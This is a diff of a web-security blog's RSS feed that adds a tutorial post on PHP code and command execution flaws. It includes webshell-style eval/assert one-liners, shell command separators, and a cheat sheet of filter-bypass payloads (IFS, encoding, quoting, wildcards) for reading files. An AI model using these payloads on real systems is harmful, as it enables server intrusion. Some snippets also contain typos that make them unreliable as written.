@@ -5,8 +5,134 @@
         <link>https://hq185187.github.io</link>
         <description>不定时更新web安全相关知识</description>
         <language>zh-CN</language>
-        <pubDate>Thu, 27 Apr 2023 23:48:42 +0800</pubDate>
-        <lastBuildDate>Thu, 27 Apr 2023 23:48:42 +0800</lastBuildDate>
+        <pubDate>Fri, 28 Apr 2023 19:14:02 +0800</pubDate>
+        <lastBuildDate>Fri, 28 Apr 2023 19:14:02 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">https://hq185187.github.io/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
+            <title>命令执行漏洞及绕过方法</title>
+            <link>https://hq185187.github.io/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
+            <pubDate>Fri, 28 Apr 2023 19:14:02 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;代码执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码执行&#34;&gt;#&lt;/a&gt; 代码执行&lt;/h2&gt;
+&lt;p&gt;代码执行：未严格过滤用户输入的参数，导致用户可以通过传参在 web 服务器上&lt;mark&gt;执行恶意代码.&lt;/mark&gt;&lt;br&gt;
+ 可变函数：一个变量名后面如果有圆括号，php 将寻找同名函数调用&lt;/p&gt;
+&lt;p&gt;eval: 将一个字符串作为 php 代码执行&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;eval($_POST[&amp;#x27;123&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;eval 是一个语言构造器，不是函数，不能当可变函数&lt;/p&gt;
+&lt;p&gt;assert (): 执行一个有返回值的 php 表达式&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;assert($_POST[&amp;#x27;123&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;php7.2 以后与 eval 一样是语言构造器不是函数&lt;/p&gt;
+&lt;p&gt;call_user_func (): 把第一个参数作为回调函数使用，其他参数是回调函数参数&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;call_user_func(&amp;#x27;assert&amp;#x27;,&amp;#x27;eval($_POST[&amp;#x27;123&amp;#x27;])&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;call_user_func_array (): 把第一个参数作为回调参数使用，第二个数组类型作为回调函数的参数&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;call_user_func_array(&amp;#x27;assert&amp;#x27;,[&amp;#x27;eval($__POST[&amp;#x27;123&amp;#x27;])&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;array_map (): 为数组的每一个元素应用回调函数，第一个参数是回调函数，第二个参数是数组&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;array_map(&amp;#x27;assert&amp;#x27;,[&amp;#x27;eval($POST[&amp;#x27;123&amp;#x27;])&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;array_filter (): 使用回调函数过滤数组中的元素。第一个参数是数组，第二个参数是回调函数&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;array_filter([&amp;#x27;eval($__POST[&amp;#x27;123&amp;#x27;])&amp;#x27;],&amp;#x27;assert&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;array_reduce (): 发送数组中的值到回调函数调用&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;array_reduce([1,2],&amp;#x27;assert&amp;#x27;,&amp;#x27;phpinfo()&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;phpinfo () 是发送的第一个参数&lt;/p&gt;
+&lt;p&gt;preg_replace (): 将匹配到的字符串替换为指定的字符串并返回完整字符串&lt;/p&gt;
+&lt;h2 id=&#34;命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#命令执行&#34;&gt;#&lt;/a&gt; 命令执行&lt;/h2&gt;
+&lt;p&gt;未严格过滤用户输入的参数，导致用户可以通过传参在 web 服务器&lt;mark&gt;终端执行系统命令&lt;/mark&gt;&lt;/p&gt;
+&lt;p&gt;system()&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;system(whoami)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;passthru()&lt;br&gt;
+ 同 system ()&lt;/p&gt;
+&lt;p&gt;exec (): 默认没有回显，需要手动加上 echo. 而且回显只会输出一行结果，因此经常用第二个数组参数接收多行结果&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$arr=[];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo exec(&amp;#x27;ipconfig&amp;#x27;,$arr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var_dump($arr);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;shell_exec (): 默认没有回显，需要手动加上 echo, 可以输出多行结果&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$arr=[];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo shell_exec(&amp;#x27;ipconfig&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;反引号：反引号内的代码被当作系统命令执行，默认没有回显&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo `ipconfig`;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;popen (): 打开一个指向进程的通道，该进程由派生给定的 command 命令执行而生产&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$fp=popen(&amp;#x27;whoami&amp;#x27;,&amp;#x27;r&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;while(!feof($fp))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$content=fgetss($fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $content;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;基础&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基础&#34;&gt;#&lt;/a&gt; 基础&lt;/h2&gt;
+&lt;h3 id=&#34;1转义字符&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1转义字符&#34;&gt;#&lt;/a&gt; 1. 转义字符&lt;/h3&gt;
+&lt;p&gt;Windows 下是 ^  Linux 下是 \&lt;/p&gt;
+&lt;h3 id=&#34;2多条命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2多条命令执行&#34;&gt;#&lt;/a&gt; 2. 多条命令执行&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Windows:&amp;amp;&amp;amp;,||,%0a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;linux:&amp;amp;&amp;amp;,||,;,$(),``,%0a,%0d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;%0a 和 %0d 是由于换行才可以多条命令执行&lt;br&gt;
+&lt;mark&gt; Linux 下双引号包裹的字符串 $() 会被当做命令执行，单引号单纯就是字符串&lt;/mark&gt;&lt;/p&gt;
+&lt;h3 id=&#34;3注释符号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3注释符号&#34;&gt;#&lt;/a&gt; 3. 注释符号&lt;/h3&gt;
+&lt;p&gt;Windows:&amp;quot;::&amp;quot;&lt;br&gt;
+Linux:&amp;quot;#&amp;quot;&lt;/p&gt;
+&lt;h2 id=&#34;常见连接符管道符&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常见连接符管道符&#34;&gt;#&lt;/a&gt; 常见连接符 (管道符)&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;|：A|B 不管 A 命令成功与否，都会去执行 b 命令。&lt;/li&gt;
+&lt;li&gt;&amp;amp;：A&amp;amp;B 各自执行&lt;/li&gt;
+&lt;li&gt;||：A||B 先执行 A，如果为假，才执行 B&lt;/li&gt;
+&lt;li&gt;&amp;amp;&amp;amp; ：A&amp;amp;&amp;amp;B 先执行 A，如果为真，才执行 B&lt;/li&gt;
+&lt;li&gt;；： A;B 先执行 A 后执行 B&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;可以执行的命令:&lt;/p&gt;
+   &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;systeminfo 查看系统信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ipconfig  查看本地网络&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net  user  查看系统用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir  查看当前目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;whoami 用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ver操作系统 (username -a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat 网络连接 (Linux是netstat -an)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tasklist 运行进程(Linux是ps -ef)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;绕过方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过方法&#34;&gt;#&lt;/a&gt; 绕过方法&lt;/h2&gt;
+&lt;h3 id=&#34;1空格绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1空格绕过&#34;&gt;#&lt;/a&gt; 1. 空格绕过&lt;/h3&gt;
+&lt;p&gt;1. &lt;code&gt;$&amp;#123;IFS&amp;#125;,&amp;#123;IFS&amp;#125;,$IFS,&amp;lt;,&amp;lt;&amp;gt;,&lt;/code&gt; &lt;br&gt;
+2.$IFS$9 $9 指传过来的第 9 个参数&lt;br&gt;
+ 3.%09 ,%0b,%0c 等，可以用 burp 在 %00-% ff 之间爆破&lt;br&gt;
+ 4. 字符串截取&lt;br&gt;
+ 1.Windows 下:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;%ProgramFiles:~10,1%&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;~是截取符,表示获取环境变量%ProgramFiles%的值,一般是C:\Program Files,这个命令在把它第十位截取一位,就是空格&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo%ProgramFiles:~10,1%111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2.Linux 下:&lt;br&gt;
+(1)$IFS$9&lt;br&gt;
+ (2){cmd,args}  bash 有效，zsh 和 dash 无效&lt;br&gt;
+ (3) 读取文件时:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat&amp;lt;&amp;gt;flag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;注意：可以让 IFS=, 来进行注入&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo;IFS=,;cat flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo;IFS=,;whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;4.&amp;lt;或者 &amp;lt;&amp;gt; 重定向&lt;/p&gt;
+&lt;h2 id=&#34;2黑名单绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2黑名单绕过&#34;&gt;#&lt;/a&gt; 2. 黑名单绕过&lt;/h2&gt;
+&lt;p&gt;1. 变量拼接&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a=c;b=at;c=fl;d=ag;$a$b$c$d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2. 单引号，双引号绕过&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ca&amp;#x27;&amp;#x27;t flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat&amp;quot;&amp;quot; flag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;3编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3编码绕过&#34;&gt;#&lt;/a&gt; 3. 编码绕过&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.$(printf &amp;quot;\154\163&amp;quot;) ==&amp;gt;ls&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.$(printf &amp;quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&amp;quot;) ==&amp;gt;cat /flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;printf,&amp;quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&amp;quot;&amp;#125;|\$0 ==&amp;gt;cat /flag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;4读文件绕过当cat被过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4读文件绕过当cat被过滤&#34;&gt;#&lt;/a&gt; 4. 读文件绕过 (当 cat 被过滤)&lt;/h2&gt;
+&lt;p&gt;(1) more: 一页一页的显示档案内容&lt;br&gt;
+ (2) less: 与 more 类似，但是比 more 更好的是，他可以 [pg dn][pg up] 翻页&lt;br&gt;
+ (3) head: 查看头几行&lt;br&gt;
+ (4) tac: 从最后一行开始显示，可以看出 tac 是 cat 的反向显示&lt;br&gt;
+ (5) tail: 查看尾几行&lt;br&gt;
+ (6) nl：显示的时候，顺便输出行号&lt;br&gt;
+ (7) od: 以二进制的方式读取档案内容&lt;br&gt;
+ (8) vi: 一种编辑器，这个也可以查看&lt;br&gt;
+ (9) vim: 一种编辑器，这个也可以查看&lt;br&gt;
+ (10) sort: 可以查看&lt;br&gt;
+ (11) uniq: 可以查看&lt;br&gt;
+ (12) file -f: 报错出具体内容&lt;/p&gt;
+&lt;h2 id=&#34;5反斜线&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5反斜线&#34;&gt;#&lt;/a&gt; 5. 反斜线&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c\at fl\ag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;612等和&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#612等和&#34;&gt;#&lt;/a&gt; 6.$1,&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mtext&gt;等和&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;2等和&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;等&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;和&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; @&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c$1at fl$@ag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;7通配符绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7通配符绕过&#34;&gt;#&lt;/a&gt; 7. 通配符绕过&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;?&amp;quot;代表一个字符,&amp;quot;*&amp;quot;代表一串字符&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.?[a][t] ?&amp;#x27;&amp;#x27;?&amp;#x27;&amp;#x27;?&amp;#x27;&amp;#x27;?&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.?at flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.?at ????&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.?[a]&amp;#x27;&amp;#x27;[t] ?&amp;#x27;&amp;#x27;?&amp;#x27;&amp;#x27;?&amp;#x27;&amp;#x27;?&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
